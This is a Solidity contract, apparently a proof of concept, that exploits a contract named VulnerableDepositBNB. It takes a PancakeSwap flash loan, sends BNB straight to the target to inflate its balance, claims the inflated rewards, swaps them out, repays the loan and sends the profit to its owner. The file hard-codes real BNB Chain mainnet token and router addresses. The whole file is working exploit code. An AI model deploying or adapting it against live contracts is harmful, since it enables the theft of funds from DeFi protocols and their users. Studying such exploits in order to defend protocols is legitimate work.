// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../interfaces/IERC20.sol";
import "../interfaces/IPancakePair.sol";
import "../interfaces/IPancakeRouter.sol";
import "../vulnerable/VulnerableDepositBNB.sol";

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract FlashLoanExploiter {
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    VulnerableDepositBNB public vulnerable;
    IERC20 public adaCash;
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address payable _vulnerable, address _adaCash) {
        vulnerable = VulnerableDepositBNB(_vulnerable);
        adaCash = IERC20(_adaCash);
        owner = msg.sender;
    }
    
    // Main exploit function
    function exploit(address pair, uint256 borrowAmount) external onlyOwner {
        // Initiate flash loan from PancakeSwap pair
        IPancakePair(pair).swap(
            borrowAmount, 
            0, 
            address(this), 
            abi.encode(borrowAmount)
        );
    }
    
    // PancakeSwap callback
    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // Decode flash loan amount
        uint256 borrowedAmount = abi.decode(data, (uint256));
        
        // Convert WBNB to BNB
        IWBNB(WBNB).withdraw(borrowedAmount);
        
        // Step 1: Send BNB to vulnerable contract to manipulate balance
        uint256 manipulationAmount = borrowedAmount / 2;
        payable(address(vulnerable)).transfer(manipulationAmount);
        
        // Step 2: Call depositBNB with small amount
        // Contract will use inflated balance for calculations
        vulnerable.depositBNB{value: 0.1 ether}();
        
        // Step 3: Claim inflated rewards
        uint256 rewardBefore = adaCash.balanceOf(address(this));
        vulnerable.claimRewards();
        uint256 rewardAfter = adaCash.balanceOf(address(this));
        
        // Step 4: Withdraw our deposits
        vulnerable.withdraw(manipulationAmount + 0.1 ether);
        
        // Step 5: Swap rewards to BNB if we got any
        if (rewardAfter > rewardBefore) {
            uint256 adaCashBalance = rewardAfter - rewardBefore;
            adaCash.approve(PANCAKE_ROUTER, adaCashBalance);
            
            address[] memory path = new address[](2);
            path[0] = address(adaCash);
            path[1] = WBNB;
            
            try IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForETH(
                adaCashBalance,
                0,
                path,
                address(this),
                block.timestamp + 100
            ) {} catch {
                // If swap fails, continue anyway
            }
        }
        
        // Step 6: Calculate and repay flash loan with fee
        uint256 fee = (borrowedAmount * 25) / 10000 + 1; // 0.25% fee
        uint256 repayAmount = borrowedAmount + fee;
        
        // Wrap BNB back to WBNB and repay
        IWBNB(WBNB).deposit{value: repayAmount}();
        IWBNB(WBNB).transfer(msg.sender, repayAmount);
        
        // Transfer profit to owner
        uint256 profit = address(this).balance;
        if (profit > 0) {
            payable(owner).transfer(profit);
        }
    }
    
    // Receive ETH
    receive() external payable {}
}